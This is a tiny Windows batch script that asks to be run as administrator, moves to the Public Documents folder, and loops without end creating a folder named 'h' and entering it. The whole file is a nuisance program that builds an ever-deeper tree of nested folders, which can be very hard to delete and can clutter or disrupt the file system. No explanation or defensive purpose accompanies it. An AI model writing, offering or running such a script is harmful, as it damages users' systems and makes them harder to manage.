@echo off
echo Ensure this batch file is running as administrator.
pause
cd C:\Users\Public\Documents
goto loop

:loop
mkdir h
cd h
goto loop
